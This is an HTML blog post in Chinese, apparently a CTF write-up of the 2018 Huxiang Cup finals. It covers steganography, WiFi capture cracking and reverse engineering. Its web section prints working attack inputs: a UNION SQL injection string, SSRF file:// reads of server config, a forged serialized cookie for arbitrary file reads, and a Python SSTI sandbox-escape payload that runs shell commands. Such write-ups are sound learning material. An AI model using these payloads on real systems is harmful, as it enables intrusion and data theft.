@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="G0fl1er">
+    
+    <meta name="description" content="一只想学技术的专科菜鸡">
+    
+    
+    
+    
+    
+    
+    <title>2018湖湘杯复赛部分题解 | G0fl1er&#39;blog</title>
+    <link href=”https://ghostfirer.github.io“ rel=”prefetch” />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/timg.jpg');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 5.0.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://ghostfirer.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">G0fl1er&#39;blog</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/categories">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/ctf/">ctf</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+                        </li>
+                        
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about/index">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://ghostfirer.github.io">G0fl1er&#39;blog</a>
+        >
+        <span>2018湖湘杯复赛部分题解</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2018/11/19/docs/15964746176674/">2018湖湘杯复赛部分题解</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2018-11-19
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2018/11/19/docs/15964746176674/">2018湖湘杯复赛部分题解</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2018-11-19
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/ctf/">ctf</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>经过了一天的大战，最后AK掉了所有的杂项和Web题目。队友是真的给力。。。</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-Disk"><a href="#1-Disk" class="headerlink" title="1.Disk"></a>1.Disk</h2><p>貌似是个取证的题目<br>直接说做法吧，用360压缩发现可以打开，而且可以解压是什么鬼？（360真香）</p>
+<p>然后发现了有flag字样的文本</p>
+<p><img src="1.png" alt="1"></p>
+<p>打开以后发现了这几个ads后缀的文件。果断都扣出来，然后16进制打开看看</p>
+<p><img src="2.png" alt="2"></p>
+<p>用HXD（16进制编辑器）打开</p>
+<p><img src="3.png" alt="2"></p>
+<p>发现在16进制的地方全是二进制的代码，那么基本思路就是：全部抠出来拼接一起：2进制&gt;16进制&gt;ascii码</p>
+<p><img src="4.png" alt="2"></p>
+<p>先进制转换工具：</p>
+<p><img src="5.png" alt="2"></p>
+<p><img src="6.png" alt="2"></p>
+<p>然后编码转换：</p>
+<p><img src="7.png" alt="2"></p>
+<p>Flag:  <code>flag&#123;4DS_1n_D1sk&#125;</code></p>
+<hr>
+<h2 id="2-Flow"><a href="#2-Flow" class="headerlink" title="2.Flow"></a>2.Flow</h2><p>这个题目有点A记录那道题的套路，没想到最后做出来真的是。</p>
+<p>基本思路：wifi数据包 &gt; 解密 &gt; 读包 &gt; 得到解密后的数据包 &gt; 找到flag</p>
+<p>得准备个字典。然后开始爆破</p>
+<p>命令：aircrack-ng -w wordlist.txt ctf.pcap</p>
+<p><img src="8.png" alt="2"></p>
+<p>得到了密码以后把CTF.pcap放进一个文件夹里面然后开始解包</p>
+<p>命令是：airdecap-ng ctf.pcap -e ctf -p password1</p>
+<p><img src="9.png" alt="2"></p>
+<p>然后就能看到解出来了一个压缩包，果然跟那个A记录一个套路。。。。。</p>
+<p>继续，分析包，直接追踪TCP看一下。发现flag</p>
+<p><img src="10.png" alt="2"></p>
+<p>Flag：<code>flag&#123;H4lf_1s_3n0ugh&#125;</code></p>
+<hr>
+<h2 id="3-longmao"><a href="#3-longmao" class="headerlink" title="3.longmao"></a>3.longmao</h2><p>这个题目据说是送分题，但是吧，确实有点绕。跟题目所述一样，没有套路。</p>
+<p>基本考点：LSB隐写、盲水印、图片手动分离</p>
+<p>先开始打开图片，没发现有什么，binwalk这些工具也都用了，没发现有什么</p>
+<p>果断用16进制打开看看</p>
+<p><img src="13.png" alt="2"></p>
+<p>发现了一段字符，不知道是什么。也经过了一系列的转换，没发现有什么有用的地方。</p>
+<p>然后发现这个图片的16进制这么长，估计是和网鼎那次一样，需要自己补齐文件头</p>
+<p>果然需要在这个地方来补齐文件头</p>
+<p><img src="13.png" alt="2"></p>
+<p>下面还需要补齐一个文件头。一共要补齐两个。<br>如果补齐以后复制的麻烦，可以选择用binwalk工具自动分离。</p>
+<p>出来以后是三张图片（包括原图）：</p>
+<p><img src="15.png" alt="2"></p>
+<p>然后看第二张，16进制里面也没发现有什么，果断去用stegsolve这个工具打开看一下</p>
+<p>经过一系列尝试，终于发现是LSB隐写。</p>
+<p><img src="16.png" alt="2"></p>
+<p>但是flag很显然少了一部分，还差一点。然后继续去看第三张图片。经过一系列尝试，最终发现在第二张和第三张有盲水印</p>
+<p>果断用脚本分离：<br>命令：bwm.py deocde 2.png 3.png flag.png</p>
+<p><img src="11.png" alt="enter description here"></p>
+<p>打开我们分离出来的盲水印：</p>
+<p><img src="12.png" alt="2"></p>
+<p>然后发现可以结合前面原图文件尾部的那段字符拼接出flag。</p>
+<p>Flag:  <code>hxb2018&#123;1e30f3b836d78d25c78cd89c18c20b4a&#125;</code></p>
+<hr>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-Web-Code-Check"><a href="#1-Web-Code-Check" class="headerlink" title="1.Web Code Check"></a>1.Web Code Check</h2><p>查看维护通知url<br><a href="http://47.107.107.94:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09">http://47.107.107.94:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09</a></p>
+<p>查看其中存在id参数，猜测是密码学问题<br>结合是维护，尝试list.7z,list.rar,list.zip,list.gz,list.tar,发现list.zip，解压缩审计源码</p>
+<p><img src="17.png" alt="2"></p>
+<p>可以看到这是一个解密函数。这里看到他对data进行了两次base64的解密，和一次AES解密（机器没有mcrypt扩展，得自己搭环境）</p>
+<p>然后可有看到下面的判断语句处!==”hxb2018”。说明语句当中必须存在hxb2018这几个字符</p>
+<p>所以最后构建加密脚本：</p>
+<figure class="highlight php5"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 打开加密算法和模式 */</span></span><br><span class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建初始向量，并且检测密钥长度。</span></span><br><span class="line"><span class="comment">     * Windows 平台请使用 MCRYPT_RAND。 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 初始化加密 */</span></span><br><span class="line"></span><br><span class="line">    mcrypt_generic_init($td, <span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>, <span class="string">&#x27;2018201920202021&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 加密数据 */</span></span><br><span class="line">    $encrypted = mcrypt_generic($td, $_GET[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;hxb2018&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结束加密，执行清理工作 */</span></span><br><span class="line">    mcrypt_generic_deinit($td);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 初始化解密模块 */</span></span><br><span class="line">    <span class="comment">//mcrypt_generic_init($td, $key, $iv);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 解密数据 */</span></span><br><span class="line">    <span class="comment">//$decrypted = mdecrypt_generic($td, $encrypted);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结束解密，执行清理工作，并且关闭模块 */</span></span><br><span class="line">    <span class="comment">//mcrypt_generic_deinit($td);</span></span><br><span class="line"></span><br><span class="line">    mcrypt_module_close($td);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 显示文本 */</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(base64_encode($encrypted));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后手动注入：<br><code>0 union select 1,2,group_concat(id,0x7e,title),4 from notice2 -- -</code></p>
+<p>成功拿到得到flag：</p>
+<p><img src="18.png" alt="2"></p>
+<hr>
+<h2 id="2-Readflag"><a href="#2-Readflag" class="headerlink" title="2.Readflag"></a>2.Readflag</h2><p>打开题目后直接说了是ssrf</p>
+<p><img src="19.png" alt="2"></p>
+<p>然后谷歌到curl可以实现 file: ///协议，读取配置文件<br>/etc/apache2/sites-enabled/000-default.conf</p>
+<p>得到源码路径，继续读取源码</p>
+<p><img src="20.png" alt="2"></p>
+<p><img src="21.png" alt="2"></p>
+<p>然后一直都是卡在REMOTE_ADDR<br>最后，多次尝试，发现可以直接读/var/www/html/ssrf/flag</p>
+<p><img src="22.png" alt="2"></p>
+<hr>
+<h2 id="3-MyNote"><a href="#3-MyNote" class="headerlink" title="3.MyNote"></a>3.MyNote</h2><p>第一次开题时以为是文件上传，修改content-type成功上传，但是没有上传路径，后来谷歌到安恒杯的一个比赛，直接尝试upload／md5(用户名)／xx.php成功执行一句话，这时候，平台撤销了。。。。。。。</p>
+<p>后来根据找到的wp，继续从picture入手</p>
+<p>首先，cookie会携带Picture变量，这个变量解url、base64得到序列化之后的字符串，这个字符串是个字符串数组，其中元素为文件名</p>
+<p><img src="23.png" alt="2"></p>
+<p>于是构造序列字符串实现任意文件读取</p>
+<p><img src="24.png" alt="2"></p>
+<p><img src="25.png" alt="2"></p>
+<p>然后直接解base64就出来了flag</p>
+<p><img src="26.png" alt="2"></p>
+<hr>
+<h2 id="4-XmeO"><a href="#4-XmeO" class="headerlink" title="4.XmeO"></a>4.XmeO</h2><p>我觉得这个题像一个ssti加沙盒逃逸问题<br>首先尝试弱密码登录，admin\admin成功进去<br>进去之后，分析为python web框架</p>
+<p><img src="27.png" alt="2"></p>
+<p>针对python web框架，最多的就是ssti，于是，在添加todo列表时开始尝试ssti<br>由于是todo列表，一开始以为选择是，然后只有删除选项</p>
+<p><img src="28.png" alt="2"></p>
+<p>后来选择否，则出现了show选项，show一下则4 测试成功</p>
+<p>然后剩下的就是沙盒逃逸了</p>
+<p><a href="https://juejin.im/entry/5a91040ef265da4e9268410e">参考掘金文章</a></p>
+<p>发现如下内建函数可执行系统命令</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;xxxxxxx&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造语句，实现ssti</p>
+<p><img src="29.png" alt="2"></p>
+<p><img src="30.png" alt="2"></p>
+<hr>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="1-Replace"><a href="#1-Replace" class="headerlink" title="1.Replace"></a>1.Replace</h2><p>个人比较菜，也就能做这一个RE。</p>
+<p>打开程序以后发现让输入key，key应该就是flag了。<br>然后PEID查一下壳看看，发现有UPX的壳</p>
+<p><img src="31.png" alt="2"></p>
+<p>然后用工具脱掉就好（但是我的是w10的机器运行不起来，只能放到w7虚拟机里面运行）</p>
+<p><img src="32.png" alt="2"></p>
+<p>然后拖到ida里面分析一下</p>
+<p><img src="33.png" alt="2"></p>
+<p>然后进入401090这个函数分析：</p>
+<p><img src="34.png" alt="2"></p>
+<p>从这里的最后一个判断来看，这里才是这个函数的重点。得到flag的条件就是:<code>byte_4021A0[v5%16*2] = (v11+v12)^25</code>。然后得到<code>byte_4021A0</code>的索引值，这个索引值就是我们的flag</p>
+<p>附上最后的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">byte_402150 = [<span class="number">0x32</span>,<span class="number">0x61</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x39</span>,<span class="number">0x63</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x66</span>,<span class="number">0x34</span>,<span class="number">0x65</span>,<span class="number">0x30</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x34</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x31</span>,<span class="number">0x39</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x34</span>,<span class="number">0x38</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x64</span>,<span class="number">0x35</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x61</span>,<span class="number">0x65</span>,<span class="number">0x36</span>]</span><br><span class="line">byte_4021A0 = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>,<span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>,<span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,<span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>,<span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>,<span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,<span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>,<span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,<span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>,<span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>,<span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,<span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>,<span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>,<span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>,<span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,<span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,<span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>,<span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>,<span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>,<span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,<span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,<span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>,<span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>,<span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,<span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>,<span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> v4 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">  v8 = byte_402150[<span class="number">2</span>*v4]</span><br><span class="line">  <span class="keyword">if</span>(v8&lt;<span class="number">48</span> <span class="keyword">or</span> v8&gt;<span class="number">57</span>):</span><br><span class="line">    v9 = v8<span class="number">-87</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    v9 = v8<span class="number">-48</span></span><br><span class="line">  v10 = byte_402150[<span class="number">2</span>*v4+<span class="number">1</span>]</span><br><span class="line">  v11 = <span class="number">16</span>*v9</span><br><span class="line">  <span class="keyword">if</span>(v10&lt;<span class="number">48</span> <span class="keyword">or</span> v10&gt;<span class="number">57</span>):</span><br><span class="line">    v12 = v10<span class="number">-87</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    v12 = v10<span class="number">-48</span></span><br><span class="line">  flag += chr(byte_4021A0.index((v11+v12)^<span class="number">25</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>最后flag：<code>flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</code></p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            G0fl1er
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>一只想学技术的专科菜鸡</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964746176926/">MSSQL学习笔记</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964746176908/">14道杂项中的隐写题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/08/04/docs/15964745856182/"></a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2019/06/16/MSSQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">MSSQL学习笔记</a>
